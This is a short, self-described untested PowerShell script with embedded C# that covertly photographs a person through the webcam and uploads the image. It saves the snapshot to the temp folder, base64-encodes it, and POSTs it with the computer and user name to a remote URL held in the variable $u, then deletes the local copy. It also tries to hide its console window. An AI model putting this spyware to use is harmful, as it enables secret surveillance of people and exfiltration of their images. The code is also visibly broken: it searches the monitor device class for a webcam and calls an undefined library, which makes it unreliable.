
# !!!!!!! not yet tested !!!!!!!! #

$webcamDeviceName = $(Get-PnpDevice -Class "Monitor").friendlyname
$imagePath = "$env:TMP\cam" + $(Get-Date -Format "yyyy-MM-dd--HH-mm-ss") + ".png"

Add-Type -TypeDefinition @"
using System;
using System.Linq;
using System.Runtime.InteropServices;
using System.Windows.Media.Imaging;

public class WebcamCapture
{
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    private static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

    [DllImport("mfplat.dll", PreserveSig = false)]
    private static extern void MFStartup(uint version, uint dwFlags = 0);

    [DllImport("mfplat.dll", PreserveSig = false)]
    private static extern void MFShutdown();

    public static void Capture(string deviceName, string imagePath)
    {
        IntPtr consoleWindow = GetConsoleWindow();
        SendMessage(consoleWindow, 0x80, (IntPtr)0, (IntPtr)0);

        MFStartup(0x20070);

        var mediaDevices = new MediaDevices.MediaDeviceList();
        var webcamDevice = mediaDevices.FirstOrDefault(device => device.FriendlyName.Equals(deviceName));
        if (webcamDevice == null)
        {
            Console.WriteLine("Webcam device not found: " + deviceName);
            return;
        }

        var webcamCapture = new MediaDevices.CaptureSource(webcamDevice);
        webcamCapture.CaptureImage(imagePath);

        MFShutdown();
    }
}
"@

[WebcamCapture]::Capture($webcamDeviceName, $imagePath)

$base64Image = [convert]::ToBase64String((([System.IO.File]::ReadAllBytes($imagePath))))
Invoke-WebRequest -uri $u -Method Post -Body $(@{ "hostname" = "$env:COMPUTERNAME" + "-$Env:UserName"; "filename"=$imagePath; "file"=$base64Image} | ConvertTo-Json) -ContentType "application/json"
rm $imagePath;
echo done;